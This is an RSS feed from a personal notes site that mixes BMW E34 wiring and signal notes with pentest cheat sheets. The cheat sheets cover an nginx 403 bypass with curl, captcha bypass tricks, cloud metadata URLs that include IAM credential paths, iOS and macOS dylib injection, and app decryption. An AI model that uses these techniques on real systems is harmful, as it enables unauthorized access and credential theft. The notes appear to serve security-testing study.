<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>duraki notes on duraki's notes</title><link>https://duraki.github.io/notes/</link><description>Recent content in duraki notes on duraki's notes</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>durakiconsulting (c) h. duraki</copyright><lastBuildDate>Fri, 29 Apr 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://duraki.github.io/notes/index.xml" rel="self" type="application/rss+xml"/><item><title>~ ideas</title><link>https://duraki.github.io/notes/~-ideas/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/~-ideas/</guid><description>SonicWall SMA100 Firmware 1day OPC Router DLL Hijacking, XML Attack via Licenses Make extension for Burp which can highlight any part of the Repeater/Intruder/ Proxy/Dec0der. A flow would is similar to: (1) selecting the appropriate text you wish to highlight; (2) rm click and select Highlight -&amp;gt; Favorited (color) from the Menu items. This came to me as an idea during the 36 hours grayhat sprint (day+night) which collected more then 40k requests.</description></item><item><title>AC and DC Signals</title><link>https://duraki.github.io/notes/ac-and-dc-signals/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/ac-and-dc-signals/</guid><description>This is part of BMW E34 Learning Resources, Topics related to Signals. See Learning Resource index page and Electronic Signals for more details.
There are two types of such signals in BMW factory/production process:
AC Type Signals, induced by shifting of a magnetic field, DC Type Signals, induced via multiple types of signals and sensors (Analog, Digital, Coded et al.). .caption-wrapper { margin-bottom: 60px !important; } .caption { } .</description></item><item><title>AC Voltage Signals</title><link>https://duraki.github.io/notes/ac-voltage-signals/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/ac-voltage-signals/</guid><description>Inductive Signals (Induced Voltage) Inductive sensors produce an AC Sine Wave (see below) signal. The AC voltage is induced by the shifting of a magnetic field. The sensor consists of an impulse wheel (the moving part), and a coil wound magnetic core (stationary part). As each &amp;ldquo;tooth&amp;rdquo; (spike) of the impulse wheel approaches the sensor tip, the magnetic field of the sensor shifts toward the impulse wheel and induces a voltage pulse in the windings.</description></item><item><title>Android Recompilation</title><link>https://duraki.github.io/notes/android-recompilation/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/android-recompilation/</guid><description>Decompile Android APK file using apktool:
# =&amp;gt; decompile $ apktool -r d AppName.apk -o AppName # =&amp;gt; recompile $ apktool b AppName Resign the APK package and install the Android application:
# =&amp;gt; sign the apk package $ keytool -genkey -keystore example.keystore -validity 10000 -alias example $ jarsigner -keystore example.keystore -verbose AppName.apk example # =&amp;gt; installation $ apk install AppName.apk</description></item><item><title>Android Reverse Engineering</title><link>https://duraki.github.io/notes/android-reverse-engineering/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/android-reverse-engineering/</guid><description>Burp Proxy Setup If using Android 7 or above, you need to export Burp CA Certificate from Proxy → Options, and selecting Import/Export CA certificate. Android wants the certificate to be in PEM format. The filename has to be equal to the subject_hash_old value appended with .0.
Note - if you are using OpenSSL &amp;lt; 1.0, you need to use subject_hash instead of subject_hash_old.
Using openssl is recommended way to convert DER to PEM format.</description></item><item><title>API Penetration Test Checklist</title><link>https://duraki.github.io/notes/api-penetration-test-checklist/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/api-penetration-test-checklist/</guid><description>--- ## Authentication - [ ] Don&amp;#39;t use `Basic Auth`. Use standard authentication instead (e.g. [JWT](https://jwt.io/), [OAuth](https://oauth.net/)). - [ ] Don&amp;#39;t reinvent the wheel in `Authentication`, `token generation`, `password storage`. Use the standards. - [ ] Use `Max Retry` and jail features in Login. - [ ] Use encryption on all sensitive data. ### JWT (JSON Web Token) - [ ] Use a random complicated key (`JWT Secret`) to make brute forcing the token very hard.</description></item><item><title>Automotive</title><link>https://duraki.github.io/notes/automotive/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/automotive/</guid><description> Automotive Hacking Ethernet in Vehicles CANFD Specifications ECU Foundation ECU Calibration ECU Compromise Vehicle Graybox Security Testing Vehicle Hacking Environment BMW E34 Learning Material Electronic Signals AC and DC Signals</description></item><item><title>Automotive Cybersecurity Videos</title><link>https://duraki.github.io/notes/automotive-cybersecurity-videos/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/automotive-cybersecurity-videos/</guid><description>https://www.youtube.com/watch?v=xHfInsMEYdQ https://www.youtube.com/watch?v=DUNWZnhneiI https://www.youtube.com/watch?v=mz55tsLnlSc https://www.youtube.com/watch?v=k50hU6aPlG8 https://www.youtube.com/watch?v=k4JD2ZUHrXA - Cert-based auth via UDS https://www.youtube.com/watch?v=KqV5nIkGKFs - CANFD explained https://www.youtube.com/watch?v=XMVLkbw1BNE - New Standard for Ethernet on a Bus Line (10BASE-T1S) https://www.youtube.com/watch?v=WW481idfcro - Cert-based auth via Vector tool https://www.youtube.com/watch?v=pxlx3_gEiFM - Embedded Security in Automotive https://www.youtube.com/watch?v=3uU0Sl-byVc - Using ML to detect anomalyes https://www.youtube.com/watch?v=QEOWjEytb6Y - Cert-based in diagnostics (in-depth) https://www.youtube.com/watch?v=bUdxpsQXeRU - Corporate security testing in Automotive https://www.youtube.com/watch?v=DuXhz4mDYZA - From TARA to Pentest https://www.youtube.com/watch?v=7D7uNqPWrXw - Using Scapy for Car pentesting</description></item><item><title>Automotive Hacking</title><link>https://duraki.github.io/notes/automotive-hacking/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/automotive-hacking/</guid><description>Link ECUs to avoid wires (weight, size, cost) Network Protocols allow ECUs to share information quickly and precisely (Ethernet &amp;amp; CANFD/CAN) Networks used between ECUs are based on Serial Communications Serial means that items of information are sent via a single stream of communication Speed of communication is measured in number of bits sent per second (bps) CAN (Controller Area Network) bus was developed to meet needs of up to 1 million bits per second (1Mbps) LIN (Local Interconnect Network) introduced to give a lower cost, lower speed altenative (~20 kbps) FlexRay was developed for more fault-tolerant, higher speed (10Mbps) network Ethernet (100Mbps) for videos and advanced driver assistance systems (new vehicles) Special ECU are used called &amp;ldquo;gateways&amp;rdquo; to interconnect different network protocols (CAN + LIN, or Ethernet + FlexRay etc.</description></item><item><title>Banana Pro Quick Guide</title><link>https://duraki.github.io/notes/banana-pro-quick-guide/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/banana-pro-quick-guide/</guid><description>todo</description></item><item><title>Bash in simple words</title><link>https://duraki.github.io/notes/bash-in-simple-words/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/bash-in-simple-words/</guid><description>The first two statements of your Bash script should be:
#!/usr/bin/env bash set -euo pipefail The first statement is a Mac, GNU/Linux, and BSD portable way of finding the location of the bash interpreter.
The second statement combines:
set -e which ensures that your script stops on first command failure. By default, when a command fails, BASH executes the next command. Looking at the logs, you might feel that the script executed successfully while some commands might have failed.</description></item><item><title>Blog Setup</title><link>https://duraki.github.io/notes/blog-setup/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/blog-setup/</guid><description>The blog is using a custom site generator called art and it uses Ruby and some wrapper magic to generate this from a rather minimal configuration setup in .home.yml file.
--- minimal: artist: &amp;#34;Your Name&amp;#34; title: &amp;#34;Blog Title&amp;#34; description: &amp;#34;Blog description.&amp;#34; theme: &amp;#34;theme-name&amp;#34; posts: in: /posts/in # =&amp;gt; post in (md) out: /posts/out # =&amp;gt; post out (html) scripts: - &amp;#34;my super href:/about/me.html&amp;#34; # =&amp;gt; Links/URIs/Other art: ga: UA-00000000-X # =&amp;gt; your Google Analytics</description></item><item><title>BMW Acronyms</title><link>https://duraki.github.io/notes/bmw-acronyms/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/bmw-acronyms/</guid><description> Acronym Description A Processed Vehicle Speed AB Airbag ABS Anti-lock Braking System ADS Engine Intake Air Control ADV Wiper Pressure Control ASC All Season Traction BC Board Computer BLS Brake Light Switch BS Block Diagram BST Battery Safety Termina CANBUS Controller Area Network(bus) CCM Check Control Module DBUS Diagnosis Bus (same as TXD) DDE Digital Diesel Electronics DIS Diagnosis and Information System DISA Differential Air Intake Control DME Digital Motor Electronics DTC Diagnostic Trouble Code DWA Theft Deterrent System DWS Tire Pressure Warning System ECM Engine control module (SAE) EDC Electronic Dampening Contro EDK Electronic Throttle Valve EGS Electronic Transmission Control EH Electronic Hydraulic EHC Electronic Height Control EKM Electronic Body Module EKP Electronic Fuel Pump ELV Electronic Steering Lock EM Electro-Mechanical EMF Electro-Mechanical Emergency Brake EO Component Location EPC Electronic Parts Catalog ETM Electronic Troubleshooting Manual FB Function Description FFB Radio Remote Control FRU Flat Rate Unit GAL Speed Dependent Volume GM General Module HR34 Heading Control 34 (Dig/Analog) IB Interior lighting Control Signal IBUS Information Bus IHKA Automatic Heating and A/C IHKR Regulated Heating and A/C IHKR1 Regulated Heating and A/C Control 1 IHKR2 Regulated Heating and A/C Control 2 IHKR3 Regulated Heating and A/C Control 3 IHKS Standard Heating and A/C IKE Instrument Cluster Electronics IR Infrared ISIS Intelligent Safety Integration System ISN Individual Serial Number KAT Catalytic Converter KATON Converter Heating (signal) KBUS Body Bus KL Terminal Designation KO Compressor “ON” Signal KOMBI Instrument Cluster KOREL Compressor Relay Signal KW Crankshaft PDC Park Distance Control LCM Lamp Check Module EML Electronic Engine Power Control LDP Leak Diagnosis Pump LEV Low Emission Vehicle LKM Lamp Control Module LL Closed Throttle LSZ Lamp Switching Center LWS 5 Steering Angle Sensor MBC Maximum Brake Control MDK Motorized Throttle Valve MF Timer with switching function for heating/ventilation MFC Multi-Function Controller MFW Multifunction Clock MID Multi-Information Display MoDiC Mobile Diagnostic Computer MRS Multiple Restraint System OBC On-Board Computer OBD On-Board Diagnosis (SAE) PB Pin Assignments PBUS Periphery Bus PWG Pedal Position Sensor RDC Tire Pressure Control RDW Tire Pressure Warning RM Relay Module RXD Wake-up Diagnosis Line RZV Direct Stationary Ignition SA Special Equipment SB Fuse Assignments SG Control Unit SGS Seat Integrated Belt System SII Service Interval Indicator SM Seat Module SP Schematic ST Connector Views SZM Central Switch Center Module TD Engine Speed TI Injector on time TL Part Throttle TRS Battery Isolation Switch TSH Door Lock Heating TU Technical Update TXD Transmitting Diagnosis Line VANOS Variable Camshaft Timing YOURF3 Integrated Heading Control w/ filter 3 VL Full load - wide open throttle WK Converter Lock-up Clutch ZAE Central Airbag Electronics ZGM Central Gateway Module ZKE Central Body Electronics ZV Central Locking System ZVM Central Locking Module ZWD Idle Control Valve</description></item><item><title>BMW AG (E34) Learning Materials</title><link>https://duraki.github.io/notes/bmw-ag-e34-learning-materials/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/bmw-ag-e34-learning-materials/</guid><description>This is Bavarian (E34 5-series focused) learning materials and resources, mostly related to ECUs, DMEs, Tuning, EE, Wirings et al. I currently daily-drive BMW E34, therefore I collect my own repair&amp;amp;restoration techniques. The documentation is written and compiled with different models and versions in mind, but keeping the methodologies of the BMW Technical Documentation collected and researched through the years. Nevertheless, a lot of topics and information presented here are #ReverseEngineered from the very low or no available resources, for years in the past.</description></item><item><title>BMW Q&amp;A</title><link>https://duraki.github.io/notes/bmw-qa/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/bmw-qa/</guid><description>What are the two main groups of signals? The two parts of an inductive sensor are? The frequency of the signal indicates? In an NTC sensor, as Temperature increases, what does Resistance do? High resistance in a PTC sensor indicates warm or cold? A 5V measurement in a NTC sensor means? Describe the purpose of the three wires used on a potentiometar? How many voltage level possibilities does a Modulated Square Wave contain?</description></item><item><title>Building Kali Linux for Banana Pro</title><link>https://duraki.github.io/notes/building-kali-linux-for-banana-pro/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/building-kali-linux-for-banana-pro/</guid><description>Equipment MacOS with GNU/Linux Virtual Machine or GNU/Linux equivalent LeMaker Banana Pro arm_pc SDCard with at least 16GB capacity (preferably &amp;ldquo;Class 10&amp;rdquo; or higher) Build Instructions The Banana Pro has a dual core 1GHz Cortex™-A7 processor with a Mali400MP2 GPU and 1GB DDR3 RAM. Kali Linux can run from an external microSD card.
Kali Linux is supporting Banana Pro but it must be built from source. You will obviously need a GNU/Linux based OS (preferably Kali Linux) &amp;ndash; although I personally use VMWare Workstation with Ubuntu 20.</description></item><item><title>Bypass 403 on nginx</title><link>https://duraki.github.io/notes/bypass-403-on-nginx/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/bypass-403-on-nginx/</guid><description>Normally a client can&amp;rsquo;t access /admin directory because of front nginx server which returns 403 Forbidden. We can:
* use `X-Rewrite-Url` or `X-original-url` * back server processes these headers and front server doesn't. Steps to reproduce:
normally
$ curl -i -s -k -X $&amp;#39;GET&amp;#39; -H $&amp;#39;Host: login.example.com&amp;#39; $&amp;#39;https://login.example.com/admin/login&amp;#39; 403 Forbidden ... bypass (1)
$ curl -i -s -k -X $&amp;#39;GET&amp;#39; -H $&amp;#39;Host: login.example.com&amp;#39; -H $&amp;#39;X-rewrite-url: admin/login&amp;#39; $&amp;#39;https://login.example.com/&amp;#39; 200 OK bypass (2)</description></item><item><title>Byteman</title><link>https://duraki.github.io/notes/byteman/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/byteman/</guid><description>Introduction Byteman is a bytecode manipulation tool for tweaking and changing Java application at load time and runtime. It work without the needs for recompilation. The modification is purely in memory, via Event Condition Action rule language - based on Java.
Rules Write ECA based rules which you can inject using Byteman directives and command line application.
# =&amp;gt; trace.btm RULE trace main entry CLASS ^CognitiveApp METHOD main AT ENTRY IF TRUE DO traceln(&amp;#34;Byteman: Application loaded successfully.</description></item><item><title>Byteman Scripts</title><link>https://duraki.github.io/notes/byteman-scripts/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/byteman-scripts/</guid><description>Simple trace skeleton
RULE trace CLASS ^App METHOD login AT ENTRY IF true DO System.out.println(&amp;#34; Tracing login stdout&amp;#34;) DO traceln(&amp;#34;Tracing login ended&amp;#34;) ENDRULE Trace application entry
RULE trace application entry CLASS ^App METHOD main AT ENTRY IF TRUE DO traceln(&amp;#34;BMB java.application.main() called!&amp;#34;) ENDRULE Trace application exit
RULE trace application exit CLASS ^App METHOD main AT EXIT IF TRUE DO traceln(&amp;#34;BMB java.application exited&amp;#34;) ENDRULE Thread start
RULE trace thread start CLASS java.</description></item><item><title>C Plus Plus Demangler</title><link>https://duraki.github.io/notes/c-plus-plus-demangler/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/c-plus-plus-demangler/</guid><description>Install C++ demangler globally via npm using the following command:
$ npm i frida-compile demangler-js -g Now in Frida Script you can use something like this snippet to demangle obfuscated C++ module or library:
const demangle = require(&amp;#39;demangler-js&amp;#39;).demangle; ... Module.enumerateExportsSync(&amp;#39;library.so&amp;#39;) .filter(x =&amp;gt; x.name.startsWith(&amp;#39;_Z&amp;#39;)) .forEach(x =&amp;gt; { Interceptor.attach(x.address, { onEnter: function (args) { console.log(&amp;#39;[-] &amp;#39; + demangle(x.name)); } }); }); Compile via frida-compile:
$ frida-compile script.js -o out.js Run the demangler with Frida as usual, but make sure to include newly compiled script:</description></item><item><title>CANFD Specifications</title><link>https://duraki.github.io/notes/canfd-specifications/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/canfd-specifications/</guid><description> Extended CAN frame. Can send larger payloads. A bit different structure. Using CANEdge2 for testing the CANFD frames.</description></item><item><title>Captcha Bypass Tricks</title><link>https://duraki.github.io/notes/captcha-bypass-tricks/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/captcha-bypass-tricks/</guid><description>Header Injection to bypoass Captcha
1. Response manipulation. 2. Use previously used token. 3. Use any token with same length(+1/-1). 4. Remove the param value or remove the entire parameter. 5. Change method from POST to GET(or PUT) and remove the captcha. 6. Change body to JSON or vice-versa. 7. OCR. 8. Check whether the captcha is in the source code. (Ex: 2+2) 9. Check whether the value of the captcha is in the source code.</description></item><item><title>Circuit Basics</title><link>https://duraki.github.io/notes/circuit-basics/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/circuit-basics/</guid><description>Types of measurements There are basically two types of measurements; the voltage measurement and the current measurement. In addition, there is also the resistance measurement or continuity measurement.
Voltage measurement With a voltage measurement you can track whether and how far the voltage from the voltage source (usually the battery) is carried to the consumer via the switch and fuse. This is always done parallel to the consumer, unless the circuit diagram gives other options because the lamp z.</description></item><item><title>Classical</title><link>https://duraki.github.io/notes/classical/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/classical/</guid><description> OSINT Web Pentest Oneliners Web Fuzzing SQL Injection Payloads Cloud Metadata XSS Payloads Captcha Bypass 403 Bypass Virtual Host Enumeration API Abuse</description></item><item><title>Classical API Abuse</title><link>https://duraki.github.io/notes/classical-api-abuse/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/classical-api-abuse/</guid><description>API Keys Reuse Use Keyhacks to scan for key leaks.
API Calling Convention Try to hook() on a call or initiate new calls from the handler.</description></item><item><title>Cloud Metadata</title><link>https://duraki.github.io/notes/cloud-metadata/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/cloud-metadata/</guid><description>AWS # from http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories http://169.254.169.254/latest/user-data http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME] http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME] http://169.254.169.254/latest/meta-data/ami-id http://169.254.169.254/latest/meta-data/reservation-id http://169.254.169.254/latest/meta-data/hostname http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key AWS (dirs ) http://169.254.169.254/ http://169.254.169.254/latest/meta-data/ http://169.254.169.254/latest/meta-data/public-keys/ Google Cloud # https://cloud.google.com/compute/docs/metadata # - Requires the header &amp;#34;Metadata-Flavor: Google&amp;#34; or &amp;#34;X-Google-Metadata-Request: True&amp;#34; http://169.254.169.254/computeMetadata/v1/ http://metadata.google.internal/computeMetadata/v1/ http://metadata/computeMetadata/v1/ http://metadata.google.internal/computeMetadata/v1/instance/hostname http://metadata.google.internal/computeMetadata/v1/instance/id http://metadata.google.internal/computeMetadata/v1/project/project-id # Google allows recursive pulls http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true Google # Beta does NOT require a header atm (thanks Mathias Karlsson @avlidienbrunn) http://metadata.google.internal/computeMetadata/v1beta1/ Digital Ocean # https://developers.digitalocean.com/documentation/metadata/ http://169.254.169.254/metadata/v1.json http://169.254.169.254/metadata/v1/ http://169.254.169.254/metadata/v1/id http://169.254.169.254/metadata/v1/user-data http://169.254.169.254/metadata/v1/hostname http://169.254.169.254/metadata/v1/region http://169.</description></item><item><title>Coded Ground Signals</title><link>https://duraki.github.io/notes/coded-ground-signals/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/coded-ground-signals/</guid><description>Coded Ground Signals produce a set of High/Low requests, the combination (pattern) which is interpreted by the Control Module, to perform a specific function. Coded Ground Signals are generated through a switch, or a series of switches, signaling the control module requests for operation.
Below is an example of Wiper Switch Schematic, presenting a switch-based logic, depending on the pattern (Pin Status), executing different function depending on the Pin values.</description></item><item><title>Cycript</title><link>https://duraki.github.io/notes/cycript/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/cycript/</guid><description>Tips and Tricks for Cycript
Remote connection to Cycript
hcy = dlopen(&amp;#34;libcycript.dylib&amp;#34;, 1) CYListenServer=(typedef void(short)) (dlysym(hcy, &amp;#34;CYListenServer&amp;#34;)) CYListenServer(55000) tcprelay -t 55000:55000 cycript -r 127.0.0.1:55000 Get loaded dyld modules
cy# utils.get_dyld_info() cy# ObjectiveC.images Inject LOAD_DYLIB from Cycript
cy# dlopen(&amp;#34;/usr/lib/test.dylib&amp;#34;, 1) Tap an UIButton programatically
[#0x000000000 sendActionsForControlEvents:UIControlEventTouchUpInside] Get pasteboard/clipboard items
[UIPasteboard generalPasteboard].items Get UI elements dump
[[UIApp keyWindow] recursiveDescription] Remove a SubView of a SuperView
[0x000000000 removeFromSuperview] Bypass undismissable UIAlertController, (ie. Jailbreak Detected, Trial Ended, etc.</description></item><item><title>DC Digital IO Stages</title><link>https://duraki.github.io/notes/dc-digital-io-stages/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/dc-digital-io-stages/</guid><description>This document presents Input/Output (IO) stages of signals and sensors in DC Digital Voltage.
Transistor Final Stage Function Transistor takes on a number of applications that must be understood to effectively analyze a circuit. Transistor during the operation, functions as two parts, much like a relay Both the Relay and the Transistor controls high currents with low current signal .caption-wrapper { margin-bottom: 60px !important; } .caption { } .</description></item><item><title>DC Digital Sensors</title><link>https://duraki.github.io/notes/dc-digital-sensors/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/dc-digital-sensors/</guid><description> Hall Effect Sensors Magnetoresistive Sensors Designated Value Signals Coded Ground Signals Transistor Signals</description></item><item><title>DC Voltage Signals</title><link>https://duraki.github.io/notes/dc-voltage-signals/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/dc-voltage-signals/</guid><description>Types of DC Voltage Signals Five Types of DC Voltage Signals are used:
Analog Signals Digital Signals Designated Value Signals Coded Ground Signals Transistor Signals DC Voltage Signals are based on either 5 Volts or 12 Volts.
.caption-wrapper { margin-bottom: 60px !important; } .caption { } .caption-wrapper .caption-text { display: block!important; text-align: left; font-style: italic; font-size: 12px; line-height: 1.1; padding-bottom: 20px; } DC Voltage Signals DC Analog Signals Analog signals transmit information through an electrical circuit by regulating or changing the current or voltage.</description></item><item><title>Decrypt IPA from AppStore</title><link>https://duraki.github.io/notes/decrypt-ipa-from-appstore/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/decrypt-ipa-from-appstore/</guid><description>Requires iproxy and frida-ios-dump. File will be generated in current directory with *.ipa extension.
# =&amp;gt; Start iproxy $ iproxy 2222 22 # =&amp;gt; Lists App from iOS processes $ cd ~/util/re/ios/frida-ios-dump $ python dump.py -l PID Name Identifier --- - App Name Here xxx.xxxxxx.xxxxxx.xx # =&amp;gt; Dump App from iOS device $ ./dump.py xxx.xxxxxx.xxxxxx.xx ...</description></item><item><title>Designated Value Signals</title><link>https://duraki.github.io/notes/designated-value-signals/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/designated-value-signals/</guid><description>Designated Values are produced through fixed resistance positions of a multi-position switch.
As the switch is operated, the voltage drop across the resistor(s) of each switch position causes the voltage level of the input signal to change to a predetermined (designated, fixed, constant) voltage value.
These predetermined (designated) voltage signals the Control Module to perform specific functions.
.caption-wrapper { margin-bottom: 60px !important; } .caption { } .caption-wrapper .caption-text { display: block!</description></item><item><title>Dev</title><link>https://duraki.github.io/notes/dev/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/dev/</guid><description> Bash</description></item><item><title>DIN</title><link>https://duraki.github.io/notes/din/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/din/</guid><description>There is a terminal designation for almost every connection of a consumer or switch in the vehicle in order to facilitate the connection. The designation of the individual connections is defined in Germany, according to DIN 72552. The table below shows an excerpt of the most important connections from this DIN.
DIN 72552 is a DIN (Deutsches Institut für Normung) standard for labeling the electric terminals in automotive wiring. Visit this Wikipedia Link to learn more about this standard.</description></item><item><title>DYLD iOS Injection</title><link>https://duraki.github.io/notes/dyld-ios-injection/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/dyld-ios-injection/</guid><description>Inject dylib (Library) into iOS process
$ cat SomeLibrary.c # ... SomeLibrary codebase ... $ gcc -dynamiclib SomeLibrary.c -o SomeLibrary.dylib -Wall // Compile iOS dylib $ DYLD_INSERT_LIBRARIES=SomeLibrary.dylib cat 1 // Works only on CLI programs, not Apps.</description></item><item><title>DYLD MacOS Injection</title><link>https://duraki.github.io/notes/dyld-macos-injection/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/dyld-macos-injection/</guid><description>Tracing MacOS app. via CLI
$ dtruss /Application/AppName.app/Contents/MacOS/AppName $ dtrace /Application/AppName.app/Contents/MacOS/AppName Print MacOS Logs from Terminal
$ idevicesyslog Inject dylib (Library) into MacOS process
$ gcc -dynamiclib SomeLibrary.c -o SomeLibrary.dylib # compile dylib $ DYLD_INSERT_LIBRARIES=SomeLibrary.dylib /Application/AppName.app/Contents/MacOS/AppName Analyse MacOS binary for ObjC runtime/environ variables
$ OBJC_HELP=1 ./build/Debug/HelloWorld ## More Below: # objc: OBJC_HELP: describe Objective-C runtime environment variables # objc: OBJC_PRINT_OPTIONS: list which options are set # objc: OBJC_PRINT_IMAGES: log image and library names as the runtime loads them Anti-debugging techniques implemented in XNU/OSX environments</description></item><item><title>E34 Cluster Wiring Diagram</title><link>https://duraki.github.io/notes/e34-cluster-wiring-diagram/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/e34-cluster-wiring-diagram/</guid><description>Hint: Use right-click, &amp;ldquo;Open Image in New Tab&amp;rdquo; - to see full resolution.
E34 Low Cluster - EURO - MY. 88-90 Test Bench .caption-wrapper { margin-bottom: 60px !important; } .caption { } .caption-wrapper .caption-text { display: block!important; text-align: left; font-style: italic; font-size: 12px; line-height: 1.1; padding-bottom: 20px; } Wiring E34 Low Cluster, Euro, MY. &amp;lt; &amp;#39;90 - Test Bench For this cluster, there are available pinouts for the sensors and signals.</description></item><item><title>E34 Misc Wiring</title><link>https://duraki.github.io/notes/e34-misc-wiring/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/e34-misc-wiring/</guid><description>Valuable Schema Diagrams 0670-0, represent the power distribution (fuse box in the engine compartment and equipment carrier at the rear) 0670-3, the details of the fuse 0670-4, the ground distributors of all consumers 0670-5, the diagnostic connection in the circuit diagrams of the various control units. The supply voltage, fuses, and ground connections are not listed in detail 7000, lists all connectors, if necessary with image references and specifications of the connector type 7100, installation location of various plugs and components in the form of images 8000, overview of the plug connections of the main cable harnesses 8500, list all plug connectors with regard to shape and number of poles how-to schema readings: (Example)</description></item><item><title>E34 Pinout Diagram</title><link>https://duraki.github.io/notes/e34-pinout-diagram/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/e34-pinout-diagram/</guid><description>Note: if you can&amp;rsquo;t make sense of the &amp;ldquo;Terminal #&amp;rdquo; keywords in the pinouts below, refer to Terminal Designations, and DIN 72552 pages. In short, it represents a standardised/defined/constant Pin I/O.
E34 Radio Pinouts The BMW Series 5 E34 Radio Pinouts are located here.
E34 Low Cluster - EURO - MY. 88-90 Pinouts Details:
Cluster: Low (without Check Control - aka CCM) Installed in: 518i M40 (import), 520i M20, 520i M50, 524td Period: until 09/1990 Manufacturer: Motometer Identification Features: - Mechanical km counter in the speedometer - Uneven scaling on the fuel gauge - White back of the instrument cluster - Coding plug (black) is in the back of the station wagon Defects and remedies: Replace the batteries on the circuit board (1.</description></item><item><title>E34 Repair &amp; Restoration</title><link>https://duraki.github.io/notes/e34-repair-restoration/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/e34-repair-restoration/</guid><description>Please, check Upgradables as well. These show my to-do, and wishlist that I planned for my E34.
Fixing and repairing Cigarette Lighter If the cigarette lighter no longer works, simply bend the two lugs at the rear-end of the socket sligthly inwards, with a plastic rod and it will work again.
Fixing Cluster and Interior Lights Requirement
